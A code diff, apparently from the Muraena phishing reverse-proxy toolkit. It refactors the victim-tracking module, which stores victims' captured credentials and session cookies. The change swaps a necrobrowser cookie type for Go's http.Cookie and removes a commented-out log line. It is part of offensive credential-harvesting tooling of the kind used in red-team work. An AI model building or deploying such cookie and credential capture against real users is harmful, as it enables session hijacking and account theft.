@@ -3,15 +3,15 @@ package tracking
 import (
 	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"strconv"
 	"sync"
 	"time"
 
-	"github.com/muraenateam/muraena/log"
-	"github.com/muraenateam/muraena/module/necrobrowser"
-
 	"github.com/evilsocket/islazy/tui"
+
+	"github.com/muraenateam/muraena/log"
 )
 
 // Victim identifies a User-Agent being tracked
@@ -106,7 +106,6 @@ func (module *Tracker) ShowVictims() {
 
 		if len(vv.Credentials) > 0 {
 
-
 			m := map[string]interface{}{}
 			vv.Cookies.Range(func(key, value interface{}) bool {
 				m[fmt.Sprint(key)] = value
@@ -138,8 +137,7 @@ func (module *Tracker) Push(v *Victim) {
 	}
 }
 
-func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCookie) {
-
+func (module *Tracker) AddToCookieJar(v *Victim, cookie http.Cookie) {
 	if cookie.Domain == module.Session.Config.Proxy.Phishing {
 		return
 	}
@@ -153,9 +151,5 @@ func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCook
 	victim := vv.(*Victim)
 	cookieKey := fmt.Sprintf("%s_%s_%s", cookie.Name, cookie.Path, cookie.Domain)
 	victim.Cookies.Store(cookieKey, cookie)
-
-	//module.Info("[%s] New cookie %s:%s [%s] (key: %s)", victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Value),
-	//	tui.Bold(cookie.Domain), tui.Red(cookieKey))
-
 	module.Victims.Store(victim.ID, victim)
 }
